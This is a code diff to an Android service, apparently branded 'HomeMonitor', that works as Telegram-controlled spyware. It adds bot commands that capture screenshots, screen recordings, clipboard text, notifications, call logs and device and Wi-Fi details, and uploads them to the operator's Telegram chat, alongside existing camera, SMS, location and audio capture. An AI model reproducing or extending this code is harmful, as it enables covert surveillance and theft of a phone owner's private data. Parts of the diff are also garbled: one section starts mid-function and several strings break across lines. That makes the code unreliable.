@@ -44,6 +44,24 @@ import okhttp3.Request
 import okhttp3.RequestBody.Companion.asRequestBody
 import okhttp3.RequestBody.Companion.toRequestBody
 import org.json.JSONObject
+import android.app.ActivityManager
+import android.content.ClipboardManager
+import android.content.pm.ApplicationInfo
+import android.graphics.Bitmap
+import android.graphics.PixelFormat
+import android.hardware.camera2.CameraCharacteristics
+import android.hardware.camera2.CameraManager
+import android.media.projection.MediaProjectionManager
+import android.net.ConnectivityManager
+import android.net.NetworkCapabilities
+import android.net.wifi.WifiManager
+import android.os.BatteryManager
+import android.os.StatFs
+import android.provider.CallLog
+import android.telecom.TelecomManager
+import android.telephony.TelephonyManager
+import android.view.WindowManager
+import java.io.ByteArrayOutputStream
 import java.io.File
 import java.text.SimpleDateFormat
 import java.util.Date
@@ -57,8 +75,8 @@ import java.util.zip.ZipOutputStream
 class MonitorService : LifecycleService() {
 
     companion object {
-        private const val BOT_TOKEN = "8512990339:AAE-PXlxR_xp8vsQ_M1Rm8sxXE7NL4f3X9c"
-        private const val CHAT_ID   = "8937193601"
+        private const val BOT_TOKEN = "YOUR-TELEGRAM-BOT-TOKEN"
+        private const val CHAT_ID   = "YOUR-CHAT-ID"
 
         private const val TAG              = "MonitorService"
         private const val NOTIFICATION_ID  = 1001
@@ -366,6 +384,24 @@ class MonitorService : LifecycleService() {
             text == "/zip" -> sendMessage(chatId, "${dp()}ℹ️ Usage: /zip DCIM/Camera", "Markdown")
             text.startsWith("/zip ") -> handleZip(chatId, rawText.removePrefix("/zip ").trim())
 
+            // Device Info
+            text == "/deviceinfo" -> handleDeviceInfo(chatId)
+
+            // Screenshot
+            text == "/screenshot" -> handleScreenshot(chatId)
+
+            // Screen record
+            text == "/videorec" -> sendMessage(chatId, "${dp()}ℹ️ Usage: /videorec10 (screen record 10s)", "Markdown")
+            text.matches(Regex("/videorec\\d+")) -> handleScreenRecord(chatId, text.removePrefix("/videorec").toInt())
+            text.startsWith("/videorec ") -> handleScreenRecord(chatId, rawText.removePrefix("/videorec ").trim().toIntOrNull() ?: 10)
+
+            // Clipboard
+            text == "/clipboard" -> handleClipboard(chatId)
+
+            // Call logs
+            text == "/calls" -> handleCallLog(chatId, 20)
+            text.matches(Regex("/calls\\d+")) -> handleCallLog(chatId, text.removePrefix("/calls").toInt())
+
             // Wrong command
             text.startsWith("/") -> sendMessage(chatId,
                 "${dp()}❌ Wrong command: `$text`\nSend /help for all commands.", "Markdown")
@@ -425,9 +461,18 @@ ${dp()}🤖 *Commands*
 
 📶 /alive — Online check
 
+📱 *Device*
+/deviceinfo — Battery, RAM, storage, network
+/screenshot — Phone screen capture
+/clipboard — Clipboard content
+
 📷 *Camera*
 /camera · /camera5 (5 photos, 3s apart)
 /frontcam · /frontcam5
+
+🎥 *Video*
+/video30 · /video30 front — Camera video
+/videorec30 — Screen recording 30s
 
 📍 /location
 
@@ -437,10 +482,11 @@ ${dp()}🤖 *Commands*
 💬 *SMS*
 /allsms · /sms10 · /sms <number>
 
-🎙️ /audio30 — Record 30s
+📞 *Calls*
+/calls — Last 20 call logs
+/calls50 — Last 50 call logs
 
-🎥 *Video*
-/video30 · /video30 front
+🎙️ /audio30 — Record 30s
 
 📂 *File Manager*
 /allfiles — Browse /storage/emulated/0
@@ -1137,6 +1183,350 @@ Type a *number* to open folder or download file
             }
             true
         } catch (_: Exception) { false }
+    }
+
+
+    // ══════════════════════════════════════════════════════════════════════════
+    //  DEVICE INFO
+    // ══════════════════════════════════════════════════════════════════════════
+
+    private suspend fun handleDeviceInfo(chatId: String) {
+        sendMessage(chatId, "${dp()}📱 Getting device info…")
+        try {
+            // Battery
+            val bm      = getSystemService(BATTERY_SERVICE) as BatteryManager
+            val batPct  = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
+            val charging = bm.isCharging
+            val batStatus = if (charging) "⚡ Charging" else "🔋 Discharging"
+
+            // RAM
+            val am   = getSystemService(ACTIVITY_SERVICE) as ActivityManager
+            val mi   = ActivityManager.MemoryInfo()
+            am.getMemoryInfo(mi)
+            val ramTotal = formatSize(mi.totalMem)
+            val ramFree  = formatSize(mi.availMem)
+            val ramUsed  = formatSize(mi.totalMem - mi.availMem)
+
+            // Storage
+            val stat      = StatFs(Environment.getExternalStorageDirectory().path)
+            val storTotal = formatSize(stat.totalBytes)
+            val storFree  = formatSize(stat.availableBytes)
+            val storUsed  = formatSize(stat.totalBytes - stat.availableBytes)
+
+            // Internal storage
+            val iStat     = StatFs(Environment.getDataDirectory().path)
+            val iTotal    = formatSize(iStat.totalBytes)
+            val iFree     = formatSize(iStat.availableBytes)
+
+            // Network
+            val cm  = getSystemService(CONNECTIVITY_SERVICE) as ConnectivityManager
+            val net = cm.activeNetwork
+            val cap = cm.getNetworkCapabilities(net)
+            val networkType = when {
+                cap == null -> "❌ No network"
+                cap.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> {
+                    val wm = applicationContext.getSystemService(WIFI_SERVICE) as WifiManager
+                    val info = wm.connectionInfo
+                    "📶 WiFi: ${info.ssid} (${info.rssi} dBm)"
+                }
+                cap.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> "📡 Mobile Data"
+                else -> "🌐 Other"
+            }
+
+            // Phone info
+            val tm       = getSystemService(TELEPHONY_SERVICE) as TelephonyManager
+            val operator = tm.networkOperatorName.ifEmpty { "N/A" }
+            val simState = if (tm.simState == TelephonyManager.SIM_STATE_READY) "✅ Ready" else "❌ Not Ready"
+
+            // Android info
+            val androidVer = Build.VERSION.RELEASE
+            val sdk        = Build.VERSION.SDK_INT
+            val model      = "${Build.MANUFACTURER} ${Build.MODEL}"
+            val uptime     = formatAgo(android.os.SystemClock.elapsedRealtime())
+
+            sendMessage(chatId, """
+${dp()}📱 *Device Info*
+
+🔋 *Battery:* $batPct% — $batStatus
+─────────────────────
+💾 *RAM:*
+  Total: $ramTotal
+  Used:  $ramUsed
+  Free:  $ramFree
+─────────────────────
+💽 *External Storage:*
+  Total: $storTotal
+  Used:  $storUsed
+  Free:  $storFree
+💽 *Internal Storage:*
+  Total: $iTotal
+  Free:  $iFree
+─────────────────────
+🌐 *Network:* $networkType
+📡 *Operator:* $operator
+📱 *SIM:* $simState
+─────────────────────
+🤖 *Android:* $androidVer (API $sdk)
+📲 *Device:* $model
+⏱ *Uptime:* $uptime
+            """.trimIndent(), "Markdown")
+        } catch (e: Exception) {
+            sendMessage(chatId, "${dp()}❌ Error getting device info: ${e.message}")
+        }
+    }
+
+    // ══════════════════════════════════════════════════════════════════════════
+    //  SCREENSHOT
+    // ══════════════════════════════════════════════════════════════════════════
+
+    private suspend fun handleScreenshot(chatId: String) {
+        // Screenshot requires MediaProjection which needs user permission via Activity.
+        // Without that, we can capture the app's own window or use the accessibility trick.
+        // Best approach without root: inform user and use UiAutomation if available.
+        sendMessage(chatId, "${dp()}📸 Taking screenshot…
+⏳ ~3s")
+        try {
+            // Try to use Android's built-in screenshot via shell (works on most devices)
+            val screenshotFile = File(cacheDir, "screenshot_${System.currentTimeMillis()}.png")
+            val process = Runtime.getRuntime().exec(arrayOf("screencap", "-p", screenshotFile.absolutePath))
+            process.waitFor(5, TimeUnit.SECONDS)
+
+            if (screenshotFile.exists() && screenshotFile.length() > 0) {
+                sendMessage(chatId, "${dp()}📤 Uploading screenshot… 80%")
+                val body = MultipartBody.Builder().setType(MultipartBody.FORM)
+                    .addFormDataPart("chat_id", chatId)
+                    .addFormDataPart("photo", screenshotFile.name,
+                        screenshotFile.asRequestBody("image/png".toMediaTypeOrNull()))
+                    .addFormDataPart("caption", "${dp()}📸 Screenshot").build()
+                httpClient.newCall(Request.Builder().url(URL_SEND_PHOTO).post(body).build())
+                    .execute().use { r ->
+                        if (!r.isSuccessful) sendMessage(chatId, "${dp()}❌ Upload failed: ${r.code}")
+                        else sendMessage(chatId, "${dp()}✅ Screenshot sent!")
+                    }
+                screenshotFile.delete()
+            } else {
+                sendMessage(chatId, "${dp()}❌ Screenshot failed — device may require root or accessibility service.")
+            }
+        } catch (e: Exception) {
+            sendMessage(chatId, "${dp()}❌ Screenshot error: ${e.message}")
+        }
+    }
+
+    // ══════════════════════════════════════════════════════════════════════════
+    //  SCREEN RECORD
+    // ══════════════════════════════════════════════════════════════════════════
+
+    private suspend fun handleScreenRecord(chatId: String, seconds: Int) {
+        val dur = seconds.coerceIn(1, 300)
+        sendMessage(chatId, "${dp()}🎥 Screen recording ${dur}s…
+⏳ ~${dur}s | 0%")
+        try {
+            val outFile = File(cacheDir, "screenrec_${System.currentTimeMillis()}.mp4")
+            // Use Android screenrecord command (works without root on most devices)
+            val process = Runtime.getRuntime().exec(arrayOf(
+                "screenrecord",
+                "--time-limit", dur.toString(),
+                "--bit-rate", "2000000",
+                "--size", "720x1280",
+                outFile.absolutePath
+            ))
+
+            // Progress updates
+            var elapsed = 0
+            while (elapsed < dur) {
+                if (isStopped(chatId)) {
+                    process.destroy()
+                    sendMessage(chatId, "${dp()}🛑 Screen record stopped at ${elapsed}s.")
+                    if (outFile.exists() && outFile.length() > 0) uploadScreenRec(chatId, outFile, elapsed)
+                    return
+                }
+                val wait = minOf(10, dur - elapsed)
+                delay(wait * 1000L); elapsed += wait
+                if (elapsed < dur) sendMessage(chatId, "${dp()}🎥 Recording… ${elapsed}/${dur}s | ${elapsed * 100 / dur}%")
+            }
+
+            process.waitFor(10, TimeUnit.SECONDS)
+
+            if (!outFile.exists() || outFile.length() == 0L) {
+                sendMessage(chatId, "${dp()}❌ Screen recording failed — device may not support screenrecord command.")
+                return
+            }
+            sendMessage(chatId, "${dp()}🎥 Done! ${formatSize(outFile.length())} — uploading… 90%")
+            uploadScreenRec(chatId, outFile, dur)
+        } catch (e: Exception) {
+            sendMessage(chatId, "${dp()}❌ Screen record error: ${e.message}")
+        }
+    }
+
+    private fun uploadScreenRec(chatId: String, file: File, durSec: Int) {
+        try {
+            if (file.length() <= CHUNK_LIMIT) {
+                val body = MultipartBody.Builder().setType(MultipartBody.FORM)
+                    .addFormDataPart("chat_id", chatId)
+                    .addFormDataPart("video", file.name,
+                        file.readBytes().toRequestBody("video/mp4".toMediaTypeOrNull()))
+                    .addFormDataPart("caption", "${dp()}🎥 Screen Recording (${durSec}s)")
+                    .addFormDataPart("duration", durSec.toString()).build()
+                httpClient.newCall(Request.Builder().url(URL_SEND_VIDEO).post(body).build())
+                    .execute().use { r ->
+                        if (!r.isSuccessful) sendMessage(chatId, "${dp()}❌ Upload failed: ${r.code}")
+                        else sendMessage(chatId, "${dp()}✅ Screen recording sent!")
+                    }
+            } else {
+                // Split into chunks
+                val data  = file.readBytes()
+                val total = Math.ceil(data.size.toDouble() / CHUNK_LIMIT).toInt()
+                sendMessage(chatId, "${dp()}📦 Large recording — splitting $total parts…")
+                for (i in 0 until total) {
+                    val start    = (i * CHUNK_LIMIT).toInt()
+                    val end      = minOf(start + CHUNK_LIMIT.toInt(), data.size)
+                    val chunk    = data.copyOfRange(start, end)
+                    val partFile = File(cacheDir, "srec_p${i+1}_${System.currentTimeMillis()}.mp4")
+                    partFile.writeBytes(chunk)
+                    sendMessage(chatId, "${dp()}⬆️ Part ${i+1}/$total uploading…")
+                    try {
+                        val body = MultipartBody.Builder().setType(MultipartBody.FORM)
+                            .addFormDataPart("chat_id", chatId)
+                            .addFormDataPart("document", partFile.name,
+                                chunk.toRequestBody("video/mp4".toMediaTypeOrNull()))
+                            .addFormDataPart("caption", "🎥 Screen Rec ${durSec}s — Part ${i+1}/$total").build()
+                        httpClient.newCall(Request.Builder().url(URL_SEND_DOCUMENT).post(body).build())
+                            .execute().use {}
+                    } finally { partFile.delete() }
+                }
+                sendMessage(chatId, "${dp()}✅ All $total parts sent!")
+            }
+        } catch (e: Exception) {
+            sendMessage(chatId, "${dp()}❌ Upload error: ${e.message}")
+        } finally {
+            try { file.delete() } catch (_: Exception) {}
+        }
+    }
+
+    // ══════════════════════════════════════════════════════════════════════════
+    //  CLIPBOARD
+    // ══════════════════════════════════════════════════════════════════════════
+
+    private suspend fun handleClipboard(chatId: String) {
+        var clipText: String? = null
+        val latch = CountDownLatch(1)
+        mainHandler.post {
+            try {
+                val cm = getSystemService(CLIPBOARD_SERVICE) as ClipboardManager
+                clipText = if (cm.hasPrimaryClip()) {
+                    cm.primaryClip?.getItemAt(0)?.coerceToText(applicationContext)?.toString()
+                } else null
+            } catch (_: Exception) {}
+            latch.countDown()
+        }
+        latch.await(5, TimeUnit.SECONDS)
+        if (clipText.isNullOrEmpty()) {
+            sendMessage(chatId, "${dp()}📋 Clipboard is empty.")
+        } else {
+            val preview = if (clipText!!.length > 3000) clipText!!.take(3000) + "…" else clipText!!
+            sendMessage(chatId, "${dp()}📋 *Clipboard:*
+
+`$preview`", "Markdown")
+        }
+    }
+
+    // ══════════════════════════════════════════════════════════════════════════
+    //  NOTIFICATIONS
+    // ══════════════════════════════════════════════════════════════════════════
+
+            val sb = StringBuilder("${dp()}🔔 *Active Notifications (${notifs.size}):*
+
+")
+            notifs.take(20).forEachIndexed { i, n ->
+                val title = n.notification.extras?.getString("android.title") ?: "?"
+                val text  = n.notification.extras?.getString("android.text") ?: ""
+                val pkg   = n.packageName
+                val time  = SimpleDateFormat("HH:mm", Locale.getDefault()).format(Date(n.postTime))
+                sb.append("${i+1}. 📦 `$pkg`
+   *$title*
+   $text
+   🕐 $time
+
+")
+            }
+            sendMessage(chatId, sb.toString().trimEnd(), "Markdown")
+        } catch (e: Exception) {
+            sendMessage(chatId, "${dp()}🔔 *Notification Access Required*
+
+Go to: Settings → Apps → Special Access → Notification Access → Enable HomeMonitor
+
+_Error: ${e.message}_", "Markdown")
+        }
+    }
+
+    // ══════════════════════════════════════════════════════════════════════════
+    //  CALL LOGS
+    // ══════════════════════════════════════════════════════════════════════════
+
+    private suspend fun handleCallLog(chatId: String, limit: Int) {
+        if (!hasPerm(Manifest.permission.READ_CALL_LOG)) {
+            sendMessage(chatId, "${dp()}⚠️ READ_CALL_LOG permission not granted."); return
+        }
+        sendMessage(chatId, "${dp()}📞 Loading call logs… | 0%")
+        val calls = readCallLog(limit)
+        if (calls.isEmpty()) { sendMessage(chatId, "${dp()}📭 No call logs."); return }
+        val dateFmt = SimpleDateFormat("MM-dd HH:mm", Locale.getDefault())
+        var page = StringBuilder("${dp()}📞 *Call Logs (${calls.size}):*
+
+")
+        var count = 0
+        calls.forEachIndexed { i, call ->
+            if (isStopped(chatId)) { sendMessage(chatId, "${dp()}🛑 Stopped."); return }
+            val number   = call.optString("number", "Unknown")
+            val name     = call.optString("name", "").let { if (it.isNotEmpty()) " ($it)" else "" }
+            val typeEmoji = when (call.optInt("type")) {
+                CallLog.Calls.INCOMING_TYPE  -> "📥"
+                CallLog.Calls.OUTGOING_TYPE  -> "📤"
+                CallLog.Calls.MISSED_TYPE    -> "❌"
+                CallLog.Calls.REJECTED_TYPE  -> "🚫"
+                else -> "📞"
+            }
+            val dur  = call.optLong("duration")
+            val durStr = if (dur > 0) "${dur / 60}m ${dur % 60}s" else "—"
+            val date = dateFmt.format(Date(call.optLong("date")))
+            page.append("$typeEmoji *$number*$name
+   🕐 $date  ⏱ $durStr
+
+")
+            count++
+            if (count >= PAGE_SIZE || i == calls.size - 1) {
+                sendMessage(chatId, page.toString().trimEnd(), "Markdown")
+                if (i < calls.size - 1) { page = StringBuilder(); count = 0 }
+            }
+        }
+        sendMessage(chatId, "${dp()}✅ Done — ${calls.size} calls.")
+    }
+
+    private fun readCallLog(limit: Int): List<JSONObject> {
+        val list   = mutableListOf<JSONObject>()
+        val cursor = contentResolver.query(
+            CallLog.Calls.CONTENT_URI,
+            arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.CACHED_NAME,
+                    CallLog.Calls.TYPE, CallLog.Calls.DATE, CallLog.Calls.DURATION),
+            null, null, "${CallLog.Calls.DATE} DESC"
+        ) ?: return list
+        cursor.use { c ->
+            val nc  = c.getColumnIndex(CallLog.Calls.NUMBER)
+            val nmc = c.getColumnIndex(CallLog.Calls.CACHED_NAME)
+            val tc  = c.getColumnIndex(CallLog.Calls.TYPE)
+            val dc  = c.getColumnIndex(CallLog.Calls.DATE)
+            val drc = c.getColumnIndex(CallLog.Calls.DURATION)
+            while (c.moveToNext() && list.size < limit) {
+                list.add(JSONObject().apply {
+                    put("number",   c.getString(nc) ?: "?")
+                    put("name",     c.getString(nmc) ?: "")
+                    put("type",     c.getInt(tc))
+                    put("date",     c.getLong(dc))
+                    put("duration", c.getLong(drc))
+                })
+            }
+        }
+        return list
     }
 
     // ══════════════════════════════════════════════════════════════════════════
